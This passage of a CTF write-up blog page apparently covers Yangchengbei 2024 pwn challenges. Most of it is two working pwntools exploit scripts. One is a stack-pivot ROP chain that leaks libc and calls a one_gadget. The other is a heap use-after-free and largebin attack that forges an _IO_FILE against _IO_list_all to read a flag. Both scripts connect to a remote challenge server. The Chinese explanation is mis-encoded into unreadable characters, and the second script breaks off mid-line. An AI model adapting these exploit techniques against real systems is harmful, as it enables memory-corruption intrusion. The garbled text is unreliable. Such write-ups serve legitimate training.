class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&quot;./ld-linux-x86-64.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line">        <span class="comment"># env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line"><span class="comment"># p = process([&#x27;./libc.so&#x27;,&#x27;./pwn&#x27;])</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;139.155.126.78&#x27;</span>,<span class="number">31213</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;sp&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;Ubuntu-22.04&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;wt.exe&#x27;, &#x27;-w&#x27;, &quot;0&quot;, &quot;sp&quot;, &quot;-d&quot;, &quot;.&quot;, &quot;wsl.exe&quot;, &quot;-d&quot;, &quot;Ubuntu-20.04&quot;, &quot;bash&quot;, &quot;-c&quot;]</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># ld = ELF(&#x27;./ld-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    <span class="keyword">global</span> heap_base</span><br><span class="line">    <span class="keyword">global</span> libc_base</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> temp</span><br><span class="line">    <span class="keyword">global</span> stack</span><br><span class="line">    <span class="keyword">global</span> leak</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ogg = [<span class="number">0xebc81</span>,<span class="number">0xebc85</span>,<span class="number">0xebc88</span>,<span class="number">0xebce2</span>,<span class="number">0xebd38</span>,<span class="number">0xebd3f</span>,<span class="number">0xebd43</span>]</span><br><span class="line"></span><br><span class="line">data = <span class="number">0x0000000000601500</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400773</span></span><br><span class="line">ret = <span class="number">0x0000000000400506</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;overflow?&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span> + p64(data) + p64(<span class="number">0x4006C4</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x30</span> + p64(data-<span class="number">0x30</span>) + p64(<span class="number">0x4006D0</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x8</span>+p64(pop_rdi)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(ret)+p64(elf.symbols[<span class="string">&#x27;vuln&#x27;</span>])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ogg)):</span><br><span class="line">    ogg[i] += libc_base</span><br><span class="line"></span><br><span class="line">data = <span class="number">0x0000000000601700</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;overflow?&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x30</span> + p64(data) + p64(<span class="number">0x4006C4</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x30</span> + p64(data-<span class="number">0x30</span>) + p64(<span class="number">0x4006D0</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">binsh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rsi = libc_base + <span class="number">0x000000000016333a</span></span><br><span class="line">pop_r13 = <span class="number">0x0000000000041c4a</span> + libc_base</span><br><span class="line">pop_r12 = <span class="number">0x0000000000035731</span> + libc_base</span><br><span class="line">pop_rbp = <span class="number">0x000000000002a2e0</span> + libc_base</span><br><span class="line">execve = libc.symbols[<span class="string">&#x27;execve&#x27;</span>] + libc_base</span><br><span class="line">pop_rdx_r12 = <span class="number">0x000000000011f2e7</span> + libc_base</span><br><span class="line">pop_rax = <span class="number">0x0000000000045eb0</span> + libc_base</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x8</span>+p64(pop_rax)+p64(<span class="number">0</span>)+p64(pop_rbp)+p64(<span class="number">0x601780</span>)+p64(ogg[<span class="number">5</span>])</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="TravelGraph"><a href="#TravelGraph" class="headerlink" title="TravelGraph"></a>TravelGraph</h3><p>è¿™æ˜¯æœ¬æ¬¡æ¯”èµ›å”¯ä¸€çš„å †é£æ°´é¢˜ï¼Œå…¶é¢˜ç›®å¤§æ¦‚çš„æ„æ€æ˜¯è®©æˆ‘ä»¬è¾“å…¥è·¯å¾„ï¼Œç„¶åæœ‰ä¸ªå‡½æ•°å«<code>Dijkstra</code>ç”¨æ¥è®¡ç®—æœ€çŸ­è·¯åŠ²ï¼Œè¿™é‡Œå…ˆçœ‹å †å—æ˜¯ç”³è¯·çš„</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/1.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥çœ‹è§å †å—çš„å¤§å°å’Œæˆ‘ä»¬é€‰ç”¨çš„äº¤é€šå·¥å…·æœ‰å…³ç³»ï¼Œèƒ½ç”³è¯·çš„å †å—å¤§å°æœ‰<code>0x520/0x530/0x540</code></p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/2.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>freeå‡½æ•°ä¸­å­˜åœ¨ååˆ†æ˜æ˜¾çš„<code>UAF</code>æ¼æ´</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/3.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>editå‡½æ•°åªèƒ½å¤Ÿä½¿ç”¨ä¸€æ¬¡ï¼Œè€Œä¸”åœ¨ä½¿ç”¨å‰éœ€è¦æ»¡è¶³<code>edit_flag2</code>å˜é‡çš„å€¼ä¸º<code>true</code>ï¼Œè¿™ä¸ªå˜é‡çš„å€¼å¯ä»¥é€šè¿‡<code>Dijkstra</code>å‡½æ•°è®¡ç®—å½“å‰åŸå¸‚è·ç¦»<code>guangzhou</code>çš„è·ç¦»æ˜¯å¦å¤§äº<code>2000</code>æ¥æ”¹å˜</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/4.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥ç”±äºaddå‡½æ•°å¯¹è·¯å¾„çš„é•¿åº¦æœ‰é™åˆ¶ï¼Œæ‰€ä»¥æ­£å¸¸æƒ…å†µä¸‹è¿™ä¸ªæ¡ä»¶æ˜¯æ— æ³•æ»¡è¶³çš„<br>æ±‚è§£æ€è·¯ä¸ºåˆ©ç”¨å †é£æ°´åˆç†æ„é€ å †å—è·å–ä¸€æ¬¡<code>edit</code>æœºä¼šï¼Œç„¶å<code>largebin attack</code>æ‰“<code>_IO_list_all</code>ã€‚ç”±äºè¿™é‡Œå¼€å¯äº†æ²™ç®±ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨<code>orw</code>è¯»å‡ºflagã€‚è¿™é¢˜çš„æ ˆåœ°å€è¿œç¨‹å’Œæœ¬åœ°æœ‰ <code>8</code> å­—èŠ‚çš„åå·®ï¼Œé€†å¤©<br>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&quot;./ld-linux-x86-64.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line">        <span class="comment"># env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line"><span class="comment"># p = process([&#x27;./libc.so&#x27;,&#x27;./pwn&#x27;])</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;139.155.126.78&#x27;</span>,<span class="number">34146</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;sp&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;Ubuntu-22.04&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;wt.exe&#x27;, &#x27;-w&#x27;, &quot;0&quot;, &quot;sp&quot;, &quot;-d&quot;, &quot;.&quot;, &quot;wsl.exe&quot;, &quot;-d&quot;, &quot;Ubuntu-20.04&quot;, &quot;bash&quot;, &quot;-c&quot;]</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># ld = ELF(&#x27;./ld-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    <span class="keyword">global</span> heap_base</span><br><span class="line">    <span class="keyword">global</span> libc_base</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> temp</span><br><span class="line">    <span class="keyword">global</span> stack</span><br><span class="line">    <span class="keyword">global</span> leak</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">citys = [<span class="string">b&#x27;guangzhou&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>, <span class="string">b&#x27;changsha&#x27;</span>, <span class="string">b&#x27;nanchang&#x27;</span>, <span class="string">b&#x27;fuzhou&#x27;</span>]</span><br><span class="line">trans = [<span class="string">b&#x27;car&#x27;</span>, <span class="string">b&#x27;train&#x27;</span>, <span class="string">b&#x27;plane&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">meau</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;distance.&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">tran,froms,tos,far,note</span>):</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;What kind of transportation do you want? car/train/plane?&#x27;</span>)</span><br><span class="line">    p.sendline(trans[tran])</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">    p.sendline(citys[froms])</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">    p.sendline(citys[tos])</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;How far?&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(far))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Note:&#x27;</span>)</span><br><span class="line">    p.send(note)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">froms,tos</span>):</span><br><span class="line">    meau(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">    p.sendline(citys[froms])</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">    p.sendline(citys[tos])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">froms,tos</span>):</span><br><span class="line">    meau(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">    p.sendline(citys[froms])</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">    p.sendline(citys[tos])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">djsk</span>(<span class="params">froms</span>):</span><br><span class="line">    meau(<span class="number">5</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">    p.sendline(citys[froms])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>():</span><br><span class="line">    meau(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>,<span class="number">3</span>)</span><br><span class="line">free(<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x510</span>)</span><br><span class="line">show(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x21ace0</span></span><br><span class="line">lg(<span class="string">&quot;libc_base&quot;</span>),</span><br><span class="line">free(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x510</span>+p32(<span class="number">2</span>)+p32(<span class="number">0</span>)+p32(<span class="number">8888</span>)+p32(<span class="number">2</span>)) <span class="comment"># 4</span></span><br><span class="line">djsk(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">free(<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment"># 8</span></span><br><span class="line">show(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Note:&#x27;</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x1461</span></span><br><span class="line">lg(<span class="string">&quot;heap_base&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">free(<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>,<span class="number">4</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">free(<span class="number">1</span>,<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">large = libc_base + <span class="number">0x21b110</span></span><br><span class="line">heap = heap_base + <span class="number">0x2930</span></span><br><span class="line">meau(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">p.sendline(citys[<span class="number">0</span>])</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">p.sendline(citys[<span class="number">0</span>])</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Which one do you want to change?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;How far?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x100</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Note:&#x27;</span>)</span><br><span class="line">target = libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]-<span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: target, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: target - <span class="number">0x100</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: target-<span class="number">0x100</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x531</span>)+p64(large)*<span class="number">2</span>+p64(target-<span class="number">0x100</span>)+p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]-<span class="number">0x20</span>)+fake_io_read[<span class="number">0x30</span>:]</span><br><span class="line">p.send(payload)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">meau(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Wrong&#x27;</span>)</span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: heap_base + <span class="number">0x5000</span>, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x500</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: heap_base + <span class="number">0x5000</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span 